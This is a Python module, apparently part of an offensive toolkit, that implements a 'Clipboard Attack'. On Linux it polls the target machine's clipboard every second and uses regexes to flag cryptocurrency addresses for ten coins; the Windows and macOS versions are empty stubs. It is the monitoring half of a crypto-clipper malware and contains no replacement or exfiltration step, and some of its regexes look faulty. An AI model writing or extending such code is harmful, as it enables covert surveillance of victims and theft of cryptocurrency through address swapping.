from .attack import Attack
import subprocess
from re import match
from time import sleep

from typing import List, Dict
from rich import print

class CyrptoAddressMatcher:
    """Class to match crypto addresses with their regex."""
    _crypto_addresses_regex = {
        'btc':'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}|^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$',
        'eth':'^0x[a-zA-F0-9]{40}$',
        'doge':'^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$',
        'ltc':'^([LM3]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}||ltc1[a-z0-9]{39,59})$',
        'xmr':'^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$',
        'bch':'^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$',
        'dash':'^X[1-9A-HJ-NP-Za-km-z]{33}$',
        'trx':'^T[A-Za-z1-9]{33}$',
        'xrp':'^r[0-9a-zA-Z]{33}$',
        'xlm':'^G[0-9A-Z]{40,60}$'
    }

    @classmethod
    def match(cls, value: str):
        """Matches the given value with the crypto addresses regex.

        Args:
            value (str): The value to match.

        Returns:
            Tuple[str, str]: The crypto address and the type of the crypto address. 
        """
        for crypto, regex in cls._crypto_addresses_regex.items():
            if match(regex, value):
                return value, crypto
        return None, None

class ClipBoard(Attack):
    def __init__(self,
                 os: str,
                 commands: Dict[str, List[str]]):
        """This module logs all clipboard changes on the target machine.

        Args:
            commands (Dict[str, List[str]]): "OS_Name": [command].
        """
        super().__init__("Clipboard Attack", 
                         "This module checks the clipboard for crypto addresses.")
        
        self._commands = commands
        self._os = os

    def execute(self):
        self.running = True

        match self._os:
            case "Windows":
                self._windows_clipboard()
            case "Linux":
                self._linux_clipboard()
            case "Darwin":
                self._mac_clipboard()
            case _:
                print("Unsupported OS.")
                self.running = False

    def _windows_clipboard(self):
        # TODO: Implement windows clipboard
        pass

    def _linux_clipboard(self):
        
        def _get_clipboard_value():
            process = subprocess.Popen(self._commands.get(self._os), stdout=subprocess.PIPE)
            return process.communicate()[0].decode().strip()

        try:
            last_value = _get_clipboard_value()
            while self.running:
                current_value = _get_clipboard_value()
                if current_value != last_value:
                    last_value = current_value
                    
                    crypto_addr, _type = CyrptoAddressMatcher.match(current_value)
                    if crypto_addr:
                        print(f"[bold green]Detected {_type.upper()} crypto address: {crypto_addr}")

                sleep(1)
        except Exception as e:
            pass
        
    def _mac_clipboard(self):
        # TODO: Implement mac clipboard
        pass
